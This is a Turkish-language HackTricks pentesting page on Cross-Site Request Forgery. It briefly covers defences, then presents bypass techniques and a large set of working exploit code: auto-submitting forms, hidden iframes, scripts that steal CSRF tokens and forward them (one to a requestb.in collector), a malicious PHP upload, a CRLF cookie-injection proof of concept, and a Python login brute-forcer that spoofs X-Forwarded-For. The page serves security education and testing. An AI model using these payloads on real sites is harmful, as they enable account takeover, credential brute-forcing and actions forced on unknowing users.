# CSRF (Cross Site Request Forgery)

{{#include ../banners/hacktricks-training.md}}

## Cross-Site Request Forgery (CSRF) Açıklaması

**Cross-Site Request Forgery (CSRF)**, web uygulamalarında bulunan bir güvenlik zafiyetidir. Bu zafiyet, saldırganların kullanıcıların kimlik doğrulanmış oturumlarını suistimal ederek onların adına işlemler yapmasına olanak tanır. Saldırı, bir kullanıcının (hedef platforma giriş yapmış) kötü niyetli bir siteyi ziyaret etmesiyle gerçekleşir. Bu site, JavaScript çalıştırma, form gönderme veya resim/fetch çağrısı yapma gibi yöntemlerle hedef hesabına istek tetikler.

### CSRF Saldırısı için Önkoşullar

Bir CSRF zafiyetinden yararlanmak için birkaç koşulun sağlanması gerekir:

1. **Değerli Bir İşlem Belirleme**: Saldırgan, kullanıcının şifresini, e-postasını değiştirme veya ayrıcalıkları yükseltme gibi istismar etmeye değer bir işlem bulmalıdır.
2. **Oturum Yönetimi**: Kullanıcının oturumu yalnızca cookies veya the HTTP Basic Authentication header yoluyla yönetiliyor olmalıdır, çünkü diğer header'lar bu amaç için manipüle edilemez.
3. **Öngörülemez Parametrelerin Olmaması**: İstek, saldırıyı engelleyebilecek öngörülemez parametreler içermemelidir.

### Hızlı Kontrol

İsteği Burp içinde yakalayabilir ve CSRF korumalarını kontrol edebilirsiniz; ayrıca tarayıcıdan test etmek için **Copy as fetch** üzerine tıklayıp isteği inceleyebilirsiniz:

<figure><img src="../images/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

### CSRF'ye Karşı Savunma

CSRF saldırılarına karşı uygulanabilecek birkaç önlem vardır:

- [**SameSite cookies**](hacking-with-cookies/index.html#samesite): Bu attribute, tarayıcının çapraz site istekleriyle birlikte cookies göndermesini engeller. [More about SameSite cookies](hacking-with-cookies/index.html#samesite).
- [**Cross-origin resource sharing**](cors-bypass.md): Hedef sitenin CORS politikası, özellikle saldırının hedef siteden gelen yanıtı okumasını gerektirdiği durumlarda saldırının uygulanabilirliğini etkileyebilir. [Learn about CORS bypass](cors-bypass.md).
- **User Verification**: Kullanıcının şifresini yeniden istemek veya bir captcha çözdürmek kullanıcının niyetini doğrulayabilir.
- **Referrer veya Origin Header'larını Kontrol Etme**: Bu header'ları doğrulamak, isteklerin güvenilir kaynaklardan geldiğini teyit etmeye yardımcı olabilir. Ancak, kötü uygulanmış kontroller URL'lerin dikkatli biçimde hazırlanmasıyla atlatılabilir, örneğin:
  - Using `http://mal.net?orig=http://example.com` (URL ends with the trusted URL)
  - Using `http://example.com.mal.net` (URL starts with the trusted URL)
- **Parametre İsimlerini Değiştirme**: POST veya GET isteklerindeki parametre isimlerini değiştirerek otomatik saldırıları önlemek mümkündür.
- **CSRF Tokens**: Her oturum için benzersiz bir CSRF token'ı eklemek ve sonraki isteklere bu token'ı zorunlu kılmak CSRF riskini önemli ölçüde azaltır. Token'ın etkinliği, CORS uygulanarak artırılabilir.

Bu savunmaları anlamak ve uygulamak, web uygulamalarının güvenliği ve bütünlüğünün korunması için kritiktir.

## Savunma Bypass'ları

### From POST to GET (method-conditioned CSRF validation bypass)

Bazı uygulamalar CSRF doğrulamasını yalnızca POST üzerinde uygular ve diğer HTTP verb'leri için atlayabilir. PHP'de yaygın bir anti-pattern şu şekilde görünür:
```php
public function csrf_check($fatal = true) {
if ($_SERVER['REQUEST_METHOD'] !== 'POST') return true; // GET, HEAD, etc. bypass CSRF
// ... validate __csrf_token here ...
}
```
Eğer kırılgan endpoint $_REQUEST'ten gelen parametreleri de kabul ediyorsa, aynı işlemi GET isteği olarak yeniden yapabilir ve CSRF token'ını tamamen atlayabilirsiniz. Bu, yalnızca POST olan bir işlemi token olmadan başarılı olan bir GET eylemine dönüştürür.

Example:

- Orijinal POST with token (beklenen):

```http
POST /index.php?module=Home&action=HomeAjax&file=HomeWidgetBlockList HTTP/1.1
Content-Type: application/x-www-form-urlencoded

__csrf_token=sid:...&widgetInfoList=[{"widgetId":"https://attacker<img src onerror=alert(1)>","widgetType":"URL"}]
```

- GET'e geçerek bypass (no token):

```http
GET /index.php?module=Home&action=HomeAjax&file=HomeWidgetBlockList&widgetInfoList=[{"widgetId":"https://attacker<img+src+onerror=alert(1)>","widgetType":"URL"}] HTTP/1.1
```

Notlar:
- Bu desen genellikle reflected XSS ile birlikte ortaya çıkar; cevaplar yanlışlıkla application/json yerine text/html olarak sunulur.
- Bunu XSS ile eşleştirmek, tek bir GET linkiyle hem kırılgan kod yolunu tetikleyip hem de CSRF kontrollerini tamamen atlayabildiğiniz için kötüye kullanımı büyük oranda kolaylaştırır.

### Lack of token

Uygulamalar token'lar mevcut olduğunda bunları doğrulama mekanizması uygulayabilir. Ancak, token yokken doğrulamanın tamamen atlanması bir güvenlik açığı oluşturur. Saldırganlar bunu, yalnızca token'ın değerini silmek yerine token'ı taşıyan parametreyi tamamen kaldırarak istismar edebilirler. Bu, doğrulama sürecini atlamalarına ve etkili bir Cross-Site Request Forgery (CSRF) saldırısı gerçekleştirmelerine imkan verir.

### CSRF token is not tied to the user session

CSRF token'larını kullanıcı oturumlarına bağlamayan uygulamalar ciddi bir güvenlik riski taşır. Bu sistemler her token'ı oluşturan oturuma bağlamak yerine global bir havuza karşı doğrulama yapar.

Saldırganların bunu nasıl kötüye kullandığı:
1. Kendi hesabıyla authenticate olur.
2. Global havuzdan geçerli bir CSRF token alır.
3. Bu token'ı bir CSRF saldırısında hedefe karşı kullanır.

Bu zafiyet, saldırganların uygulamanın yetersiz token doğrulama mekanizmasını kullanarak mağdur adına yetkisiz istekler yapmasına olanak tanır.

### Method bypass

İstek "weird" bir method kullanıyorsa, method override işlevinin çalışıp çalışmadığını kontrol edin. Örneğin, PUT kullanılıyorsa POST kullanmayı deneyebilir ve şu şekilde gönderebilirsiniz: _https://example.com/my/dear/api/val/num?__method=PUT_

Bu ayrıca bir POST isteği içinde __method parametresini göndererek veya headers kullanarak da çalışabilir:

- _X-HTTP-Method_
- _X-HTTP-Method-Override_
- _X-Method-Override_

### Custom header token bypass

Eğer istek CSRF koruma yöntemi olarak isteğe özel bir header ile token ekliyorsa:

- Özelleştirilmiş Token ve header olmadan isteği test edin.
- Tam aynı uzunlukta fakat farklı bir token ile testi yapın.

### CSRF token is verified by a cookie

Uygulamalar CSRF korumasını token'ı hem cookie hem de istek parametresinde kopyalayarak veya bir CSRF cookie'si ayarlayıp backend'de gönderilen token'ın cookie ile eşleşip eşleşmediğini doğrulayarak implemente edebilir. Uygulama, istek parametresindeki token'ın cookie'deki değerle uyumlu olup olmadığını kontrol ederek doğrulama yapar.

Ancak site, saldırganın mağdurun tarayıcısına bir CSRF cookie'si ayarlamasına izin veren CRLF gibi açıklara sahipse, bu yöntem CSRF saldırılarına karşı savunmasız hale gelir. Saldırgan bunu, sahte bir görüntü yükleyerek cookie'yi ayarlayıp ardından CSRF saldırısını başlatarak istismar edebilir.

Aşağıda bir saldırının nasıl yapılandırılabileceğine dair bir örnek gösterilmiştir:
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>
history.pushState("", "", "/")
</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input
type="hidden"
name="csrf"
value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img
src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E"
onerror="document.forms[0].submit();" />
</body>
</html>
```
> [!TIP]
> Unutmayın: eğer **csrf token session cookie ile ilişkiliyse bu saldırı işe yaramaz**; çünkü hedefin session'ını sizin session'ınız yapmanız gerekir ve dolayısıyla kendinize saldırmış olursunuz.

### Content-Type değişikliği

Bu kaynağa göre [**this**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests), **POST** metodunu kullanırken preflight isteklerinden kaçınmak için izin verilen Content-Type değerleri şunlardır:

- **`application/x-www-form-urlencoded`**
- **`multipart/form-data`**
- **`text/plain`**

Ancak, kullanılan **Content-Type**'a bağlı olarak **sunucu mantığı değişebilir**; bu yüzden belirtilen değerleri ve diğerlerini, örneğin **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._ deneyin.

Örnek (from [here](https://brycec.me/posts/corctf_2021_challenges)) JSON verisini text/plain olarak gönderme:
```html
<html>
<body>
<form
id="form"
method="post"
action="https://phpme.be.ax/"
enctype="text/plain">
<input
name='{"garbageeeee":"'
value='", "yep": "yep yep yep", "url": "https://webhook/"}' />
</form>
<script>
form.submit()
</script>
</body>
</html>
```
### JSON Verisi için Preflight İsteklerini Atlama

Bir POST isteğiyle JSON verisi göndermeye çalışırken, bir HTML formunda `Content-Type: application/json` kullanmak doğrudan mümkün değildir. Benzer şekilde, bu içerik türünü göndermek için `XMLHttpRequest` kullanılması bir preflight isteğini tetikler. Yine de, bu kısıtlamayı aşmak ve sunucunun Content-Type ne olursa olsun JSON veriyi işleyip işlemediğini kontrol etmek için kullanılabilecek yöntemler vardır:

1. **Alternatif Content Types Kullanma**: Formda `enctype="text/plain"` ayarlayarak `Content-Type: text/plain` veya `Content-Type: application/x-www-form-urlencoded` kullanın. Bu yaklaşım, backend'in Content-Type ne olursa olsun veriyi kullanıp kullanmadığını test eder.
2. **Content Type'ı Değiştirme**: Bir preflight isteğini engellerken sunucunun içeriği JSON olarak tanımasını sağlamak için veriyi `Content-Type: text/plain; application/json` ile gönderebilirsiniz. Bu preflight tetiklemez ancak sunucu `application/json` kabul edecek şekilde yapılandırıldıysa doğru işlenebilir.
3. **SWF Flash File Utilization**: Daha az yaygın ama mümkün bir yöntem, bu kısıtlamaları aşmak için bir SWF flash dosyası kullanmaktır. Bu tekniği detaylı olarak anlamak için [this post](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937) referansına bakın.

### Referrer / Origin check bypass

**Avoid Referrer header**

Uygulamalar yalnızca 'Referer' header'ı mevcut olduğunda doğrulama yapabilir. Bir tarayıcının bu header'ı göndermesini engellemek için aşağıdaki HTML meta etiketi kullanılabilir:
```xml
<meta name="referrer" content="never">
```
Bu, 'Referer' header'ın gönderilmemesini sağlar ve bazı uygulamalarda doğrulama kontrollerinin atlatılmasına yol açabilir.

**Regexp bypasses**


{{#ref}}
ssrf-server-side-request-forgery/url-format-bypass.md
{{#endref}}

Referrer'ın parametreler içinde göndereceği URL'de sunucunun domain adını ayarlamak için şunu yapabilirsiniz:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head>
<meta name="referrer" content="unsafe-url" />
</head>
<body>
<script>
history.pushState("", "", "/")
</script>
<form
action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email"
method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState(
"",
"",
"?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net"
)
document.forms[0].submit()
</script>
</body>
</html>
```
### **HEAD method bypass**

The first part of [**this CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) is explained that [Oak's source code](https://github.com/oakserver/oak/blob/main/router.ts#L281), a router is set to **handle HEAD requests as GET requests** with no response body - a common workaround that isn't unique to Oak. Instead of a specific handler that deals with HEAD reqs, they're simply **given to the GET handler but the app just removes the response body**.

Bu nedenle, eğer bir GET isteği kısıtlanıyorsa, **GET olarak işlenecek bir HEAD isteği gönderebilirsiniz**.

## **Exploit Examples**

### **Exfiltrating CSRF Token**

Eğer bir **CSRF token** **savunma** olarak kullanılıyorsa, [**XSS**](xss-cross-site-scripting/index.html#xss-stealing-csrf-tokens) zafiyetini veya [**Dangling Markup**](dangling-markup-html-scriptless-injection/index.html) zafiyetini kötüye kullanarak onu **exfiltrate** etmeye çalışabilirsiniz.

### **GET using HTML tags**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Otomatik olarak bir GET isteği göndermek için kullanılabilecek diğer HTML5 etiketleri şunlardır:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="" />
<embed src="..." />
<audio src="...">
<video src="...">
<source src="..." type="..." />
<video poster="...">
<link rel="stylesheet" href="..." />
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body {
background: url("...");
}
</style>
<bgsound src="...">
<track src="..." kind="subtitles" />
<input type="image" src="..." alt="Submit Button"
/></bgsound>
</body>
</object>
</video>
</video>
</audio>
```
### Form GET isteği
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>
history.pushState("", "", "/")
</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit()
</script>
</body>
</html>
```
### Form POST isteği
```html
<html>
<body>
<script>
history.pushState("", "", "/")
</script>
<form
method="POST"
action="https://victim.net/email/change-email"
id="csrfform">
<input
type="hidden"
name="email"
value="some@email.com"
autofocus
onfocus="csrfform.submit();" />
<!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src="x" onerror="csrfform.submit();" />
<!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit() //Way 3 to autosubmit
</script>
</body>
</html>
```
### iframe aracılığıyla Form POST isteği
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input
type="hidden"
name="email"
value="some@email.com"
autofocus
onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit()
</script>
</body>
</html>
```
### **Ajax POST isteği**
```html
<script>
var xh
if (window.XMLHttpRequest) {
// code for IE7+, Firefox, Chrome, Opera, Safari
xh = new XMLHttpRequest()
} else {
// code for IE6, IE5
xh = new ActiveXObject("Microsoft.XMLHTTP")
}
xh.withCredentials = true
xh.open(
"POST",
"http://challenge01.root-me.org/web-client/ch22/?action=profile"
)
xh.setRequestHeader("Content-type", "application/x-www-form-urlencoded") //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on")
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2",
})
</script>
```
### multipart/form-data POST isteği
```javascript
myFormData = new FormData()
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text" })
myFormData.append("newAttachment", blob, "pwned.php")
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: { "Content-Type": "application/x-www-form-urlencoded" },
mode: "no-cors",
})
```
### multipart/form-data POST isteği v2
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest()
xhr.withCredentials = true
xhr.open("POST", url, true)
//  MIME POST request.
xhr.setRequestHeader(
"Content-Type",
"multipart/form-data, boundary=" + boundary
)
xhr.setRequestHeader("Content-Length", fileSize)
var body = "--" + boundary + "\r\n"
body +=
'Content-Disposition: form-data; name="' +
nameVar +
'"; filename="' +
fileName +
'"\r\n'
body += "Content-Type: " + ctype + "\r\n\r\n"
body += fileData + "\r\n"
body += "--" + boundary + "--"

//xhr.send(body);
xhr.sendAsBinary(body)
```
### iframe içinden Form POST isteği
```html
<--! expl.html -->

<body onload="envia()">
<form
method="POST"
id="formulario"
action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva" />
</form>
<body>
<script>
function envia() {
document.getElementById("formulario").submit()
}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000"> </iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
</body>
</body>
```
### **CSRF Token çal ve bir POST request gönder**
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest()
xhr.open("POST", POST_URL, true)
xhr.withCredentials = true

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded")

// This is for debugging and can be removed
xhr.onreadystatechange = function () {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy")
}

function getTokenJS() {
var xhr = new XMLHttpRequest()
// This tels it to return it as a HTML document
xhr.responseType = "document"
xhr.withCredentials = true
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true)
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token")
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value)
}
}
// Make the request
xhr.send(null)
}

var GET_URL = "http://google.com?param=VALUE"
var POST_URL = "http://google.com?param=VALUE"
getTokenJS()
```
### **CSRF Token'ını çal ve iframe, form ve Ajax kullanarak bir Post isteği gönder**
```html
<form
id="form1"
action="http://google.com?param=VALUE"
method="post"
enctype="multipart/form-data">
<input type="text" name="username" value="AA" />
<input type="checkbox" name="status" checked="checked" />
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1() {
x1 = document.getElementById("i1")
x1d = x1.contentWindow || x1.contentDocument
t = x1d.document.getElementById("token").value

document.getElementById("token").value = t
document.getElementById("form1").submit()
}
</script>
<iframe
id="i1"
style="display:none"
src="http://google.com?param=VALUE"
onload="javascript:f1();"></iframe>
```
### **CSRF Token'ını çal ve bir iframe ve bir form kullanarak bir POST isteği gönder**
```html
<iframe
id="iframe"
src="http://google.com?param=VALUE"
width="500"
height="500"
onload="read()"></iframe>

<script>
function read() {
var name = "admin2"
var token =
document.getElementById("iframe").contentDocument.forms[0].token.value
document.writeln(
'<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">'
)
document.writeln(
'<input id="username" type="text" name="username" value="' +
name +
'" /><br />'
)
document.writeln(
'<input id="token" type="hidden" name="token" value="' + token + '" />'
)
document.writeln(
'<input type="submit" name="submit" value="Submit" /><br/>'
)
document.writeln("</form>")
document.forms[0].submit.click()
}
</script>
```
### **token çal ve 2 iframes kullanarak gönder**
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTSteal ile Ajax kullanarak CSRF token çalın ve bir form ile bir POST gönderin**
```html
<body onload="getData()">
<form
id="form"
action="http://google.com?param=VALUE"
method="POST"
enctype="multipart/form-data">
<input type="hidden" name="username" value="root" />
<input type="hidden" name="status" value="on" />
<input type="hidden" id="findtoken" name="token" value="" />
<input type="submit" value="valider" />
</form>

<script>
var x = new XMLHttpRequest()
function getData() {
x.withCredentials = true
x.open("GET", "http://google.com?param=VALUE", true)
x.send(null)
}
x.onreadystatechange = function () {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1]
document.getElementById("findtoken").value = token
document.getElementById("form").submit()
}
}
</script>
</body>
```
### CSRF ile Socket.IO
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io("http://six.jh2i.com:50022/test")

const username = "admin"

socket.on("connect", () => {
console.log("connected!")
socket.emit("join", {
room: username,
})
socket.emit("my_room_event", {
data: "!flag",
room: username,
})
})
</script>
```
## CSRF Login Brute Force

Bu code, bir CSRF token kullanarak bir login formuna Brut Force yapmak için kullanılabilir (Ayrıca olası bir IP blacklisting'ini atlatmaya çalışmak için X-Forwarded-For header'ını da kullanıyor):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Araçlar <a href="#tools" id="tools"></a>

- [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
- [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Referanslar

- [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
- [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
- [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
- [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)
- [https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)

{{#include ../banners/hacktricks-training.md}}
